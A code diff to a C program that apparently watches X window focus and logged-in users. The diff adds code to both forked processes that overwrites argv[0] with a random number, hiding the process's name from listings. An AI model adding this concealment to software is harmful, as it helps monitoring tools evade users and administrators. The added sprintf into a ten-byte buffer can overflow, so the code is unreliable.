@@ -97,6 +97,17 @@ void *timer() {
   return 0;
 }
 
+void gen_random(char *s, int len) {
+  char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+ 
+  for (int i = 0; i < len; ++i) {
+    s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
+  }
+
+  s[len] = 0;
+}
+
+
 int main(int argc, char *argv[]) {
   pid_t cpid;
   key = 42;
@@ -108,6 +119,14 @@ int main(int argc, char *argv[]) {
   cpid = fork();
 
   if(cpid == 0) { 
+
+    srand(time(NULL));
+    int r = rand();
+    char pname[10];
+    sprintf(pname, "%d", r);
+
+    int size = strlen(argv[0]); 
+    strncpy(argv[0],pname,size); 
 
     // Child
     //printf("Parent pid %d\n", getppid());
@@ -130,9 +149,17 @@ int main(int argc, char *argv[]) {
 
     // Parent 
     //printf("Child pid %d\n", cpid);
-    
+    srand(time(NULL));
+    int r = rand();
+    char pname[10];
+    sprintf(pname, "%d", r);
+
+    int size = strlen(argv[0]); 
+    strncpy(argv[0],pname,size); 
+
     display = XOpenDisplay(NULL);
     window = hasFocus();
+
     pthread_t windowChecker, userChecker;
     pthread_create(&windowChecker, NULL, check_window, NULL);
     pthread_create(&userChecker, NULL, check_users, NULL);
